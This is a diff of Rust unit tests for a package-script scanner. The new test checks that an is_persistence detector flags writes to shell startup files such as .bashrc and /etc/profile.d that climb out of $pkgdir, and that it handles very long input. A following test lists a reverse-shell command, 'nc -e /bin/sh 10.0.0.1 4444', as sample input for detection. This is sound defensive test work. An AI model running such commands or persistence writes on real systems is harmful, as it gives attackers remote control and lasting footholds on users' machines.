@@ -897,6 +897,28 @@ fn a_long_line_costs_each_reader_one_pass() {
 }
 
 #[test]
+fn a_long_word_of_startup_files_is_read_once() {
+    use super::is_persistence;
+    // One word holding a startup file's name many times over: packaged,
+    // climbing out of the package, and not packaged at all.
+    let names = ".bashrc".repeat(30_000);
+    assert!(!is_persistence(&format!("install x $pkgdir/{names}")));
+    assert!(!is_persistence(&format!(
+        "install x \"${{pkgdir}}\"/{names}"
+    )));
+    assert!(is_persistence(&format!("install x $pkgdir/{names}/../y")));
+    assert!(is_persistence(&format!("install x $pkgdir/.\\./{names}")));
+    assert!(is_persistence(&format!("install x $pkgdirs/{names}")));
+    assert!(is_persistence(&names));
+    // Only what stands in the same word counts.
+    assert!(!is_persistence("cp .. $pkgdir/etc/profile.d/x.sh"));
+    assert!(is_persistence("cp x $pkgdir/etc/profile.d/x.sh/.."));
+    assert!(is_persistence("cp $pkgdir/a/../etc/profile.d/x.sh"));
+    assert!(is_persistence("echo x >>\"$pkgdir/..\"/.bashrc"));
+    assert!(!is_persistence("echo x >>\"$pkgdir/.bashrc.zshrc\" .."));
+}
+
+#[test]
 fn remote_shells_are_caught_without_firing_on_imports() {
     for shell in [
         "nc -e /bin/sh 10.0.0.1 4444",
